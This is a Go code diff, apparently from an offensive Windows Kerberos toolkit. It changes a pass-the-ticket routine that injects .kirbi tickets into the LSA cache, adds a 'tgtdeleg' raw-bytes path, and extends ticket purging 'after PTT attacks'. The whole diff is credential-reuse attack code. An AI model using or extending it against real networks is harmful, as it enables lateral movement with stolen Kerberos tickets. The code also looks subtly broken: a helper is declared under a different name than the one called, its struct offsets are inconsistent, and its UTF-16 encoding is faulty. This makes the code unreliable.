@@ -76,8 +76,13 @@ const (
 // 3. Windows now has the ticket cached
 // 4. Any auth to the ticket's service uses it!
 func PassTheTicket(kirbi *ticket.Kirbi) error {
-	if kirbi == nil || kirbi.Cred == nil {
+	if kirbi == nil {
 		return fmt.Errorf("invalid ticket")
+	}
+
+	// Check if we have either parsed Cred or RawBytes
+	if kirbi.Cred == nil && len(kirbi.RawBytes) == 0 {
+		return fmt.Errorf("invalid ticket: no credential data")
 	}
 
 	// Connect to LSA
@@ -94,9 +99,15 @@ func PassTheTicket(kirbi *ticket.Kirbi) error {
 	}
 
 	// Marshal the ticket to bytes
-	ticketBytes, err := kirbi.ToBytes()
-	if err != nil {
-		return fmt.Errorf("failed to marshal ticket: %w", err)
+	// Use RawBytes if available (from tgtdeleg), otherwise marshal from Cred
+	var ticketBytes []byte
+	if len(kirbi.RawBytes) > 0 {
+		ticketBytes = kirbi.RawBytes
+	} else {
+		ticketBytes, err = kirbi.ToBytes()
+		if err != nil {
+			return fmt.Errorf("failed to marshal ticket: %w", err)
+		}
 	}
 
 	// Build submit request
@@ -155,8 +166,20 @@ func PassTheTicket(kirbi *ticket.Kirbi) error {
 	return nil
 }
 
-// PurgeTickets purges all tickets from the current session.
-func PurgeTickets() error {
+// PurgeTickets purges tickets from the current session.
+//
+// EDUCATIONAL: Ticket Purging
+//
+// Purging the ticket cache is useful for:
+//   - Clearing stale credentials
+//   - Forcing re-authentication
+//   - Testing fresh ticket acquisition
+//   - Cleaning up after PTT attacks
+//
+// Parameters:
+//   - all: if true, purge all tickets
+//   - serverName: if not empty, purge only tickets for this server
+func PurgeTickets(all bool, serverName string) error {
 	handle, err := lsaConnect()
 	if err != nil {
 		return err
@@ -168,10 +191,30 @@ func PurgeTickets() error {
 		return err
 	}
 
-	// KERB_PURGE_TKT_CACHE_REQUEST
-	request := make([]byte, 24)
-	request[0] = byte(KerbPurgeTicketCacheMessage)
-	// LogonId = 0, ServerName = empty, RealmName = empty
+	// KERB_PURGE_TKT_CACHE_REQUEST:
+	//   MessageType: DWORD (4 bytes)
+	//   LogonId: LUID (8 bytes)
+	//   ServerName: UNICODE_STRING (16 bytes on 64-bit)
+	//   RealmName: UNICODE_STRING (16 bytes on 64-bit)
+
+	var request []byte
+	if all || serverName == "" {
+		// Purge all tickets - send empty UNICODE_STRINGs
+		request = make([]byte, 48)
+		request[0] = byte(KerbPurgeTicketCacheMessage)
+	} else {
+		// Purge specific server
+		serverUTF16 := encodeUTF16(serverName)
+		request = make([]byte, 48+len(serverUTF16))
+		request[0] = byte(KerbPurgeTicketCacheMessage)
+
+		// ServerName UNICODE_STRING at offset 12 (after MessageType + LUID)
+		*(*uint16)(unsafe.Pointer(&request[12])) = uint16(len(serverUTF16))
+		*(*uint16)(unsafe.Pointer(&request[14])) = uint16(len(serverUTF16))
+		*(*uintptr)(unsafe.Pointer(&request[24])) = uintptr(unsafe.Pointer(&request[48]))
+
+		copy(request[48:], serverUTF16)
+	}
 
 	var response unsafe.Pointer
 	var responseSize uint32
@@ -196,4 +239,14 @@ func PurgeTickets() error {
 	}
 
 	return nil
+}
+
+// encodeUTF16 converts a string to UTF-16LE bytes
+func encodeUTF16ptt(s string) []byte {
+	result := make([]byte, len(s)*2)
+	for i, r := range s {
+		result[i*2] = byte(r)
+		result[i*2+1] = byte(r >> 8)
+	}
+	return result
 }
